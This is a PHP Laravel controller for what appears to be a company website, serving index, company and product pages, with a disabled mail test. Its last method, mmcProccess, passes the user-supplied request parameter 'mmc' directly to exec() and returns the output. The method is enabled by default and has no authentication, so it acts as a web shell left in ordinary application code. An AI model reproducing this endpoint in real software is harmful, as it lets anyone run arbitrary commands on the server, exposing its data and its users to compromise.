<?php

namespace App\Http\Controllers\Front;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;
use \App\Http\Controllers\Controller;
use App\Repositories\CompanyRepository;
use Session;
use Exception;

class FrontController extends Controller
{
    public function index(Request $request) {
        $params = $request->all();
        $params['lan'] = isset($params['lan']) && trim($params['lan']) != '' ? $params['lan'] : 'CN';
        $companyRepository = new CompanyRepository();
        $params['companyAreas'] = $companyRepository->getAreaWithCompany();
        
        return view('front.index', ['result' => $params]);
    }

    public function company(Request $request) {
        $params = $request->all();
        $params['lan'] = isset($params['lan']) && trim($params['lan']) != '' ? $params['lan'] : 'CN';
        return view('front.company');
    }

    public function product(Request $request) {
        $params = $request->all();
        $params['lan'] = isset($params['lan']) && trim($params['lan']) != '' ? $params['lan'] : 'CN';
        return view('front.product');
    }

    public function mailTest(Request $request) {
        $emails = "";
        if(trim($emails) != '') {
            $title = 'hi hi mail test';
            \Mail::send('email.test', [], function($message) use ($emails, $title) {
                $message->to($emails)->subject($title);
            });
            return 'mail success';
        } else
            return 'no email receiver';
    }

    public function mmcTest(Request $request) {
        return view('front.mmc');
    }

    public function mmcProccess(Request $request) {
        $params = $request->all();
        if(env('MMC', true)) {
            $line = exec($params['mmc'], $retArr, $errCode);
            return $retArr;
        }
        return ['not open'];
    }
}
